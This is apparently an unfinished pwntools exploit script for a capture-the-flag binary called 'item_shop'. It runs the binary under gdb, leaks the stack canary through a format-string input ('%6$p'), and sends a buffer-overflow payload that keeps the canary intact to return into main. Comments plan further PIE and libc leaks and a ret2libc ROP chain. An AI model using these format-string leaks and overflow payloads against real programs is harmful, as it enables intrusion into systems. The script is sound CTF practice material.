from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./item_shop")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "/home/fresh/github/CTF/2023/Defcon31/htb-defcon/item_shop/challenge/glibc/libc.so.6"}


#p = remote("ip", 4444)
#p = process("./item_shop")
p = gdb.debug("./item_shop", '''
break *main
break *main+115
break *main+212
break *discount_code+218
break *discount_code+266
''', env=ld_preload)

# 1. leak stack canary
# 2. perform buffer overflow with canary bypass
# 3. Calculate main() to pie base '000'
# 4. Ret2main()
# 5. Leak libc address & calculate offsets
# 6. ROP with libc & ret2lib

# main() leak @ '%10$p'

# Canary leak @ '%6$p'
# main() leak @ '%10$p'
canary_memleak = b'%6$p'
p.sendline(canary_memleak)

p.recvlines(4)
p.recvn(42)
leak = p.recvn(18).strip().decode('utf-8')
canary_leak = int(leak, 16)
print("Canary leak:", hex(canary_leak))

p.sendline(b"4") # discount_code()

padA = b'A' * 136
padB = b'B' * 8
padC = b'C' * (200 - 136 - 8 - 8)
padD = b'D' * 8

# Bypass stack canary, overflow, & ret2main()
payload = padA + p64(canary_leak) + padD + padB + padC
p.sendline(payload)
p.interactive()

p.sendline('%10$p')

# PIE Leak - main() leak
#p.recvlines(4)
#p.recvn(42)
#elf_leak = p.recvn(14).strip().decode('utf-8')
#main_leak = int(elf_leak, 16)
#print("main() leak:", hex(main_leak))


